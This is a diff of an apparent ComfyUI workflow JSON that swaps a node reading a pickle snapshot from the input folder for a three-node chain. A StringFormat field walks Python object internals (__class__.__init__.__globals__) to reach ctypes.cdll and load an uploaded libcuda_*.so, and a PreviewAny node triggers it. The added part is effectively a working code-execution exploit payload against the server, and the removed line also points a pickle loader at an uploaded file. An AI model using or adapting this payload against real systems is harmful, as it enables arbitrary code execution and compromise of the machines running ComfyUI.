@@ -1,8 +1,28 @@
 {
   "1": {
-    "class_type": "VisualizeCUDAMemoryHistory",
+    "class_type": "CreateHookKeyframe",
     "inputs": {
-      "snapshot_path": "/mnt/md0/ai/ComfyUI/input/cuda_snap_1782253528.pkl"
+      "strength_mult": 1.0,
+      "start_percent": 0.0
+    }
+  },
+  "2": {
+    "class_type": "StringFormat",
+    "inputs": {
+      "f_string": "{a.__class__.__init__.__globals__[comfy].memory_management.ctypes.cdll[/mnt/md0/ai/ComfyUI/input/libcuda_1782373126.so]}",
+      "values.a": [
+        "1",
+        0
+      ]
+    }
+  },
+  "3": {
+    "class_type": "PreviewAny",
+    "inputs": {
+      "source": [
+        "2",
+        0
+      ]
     }
   }
 }
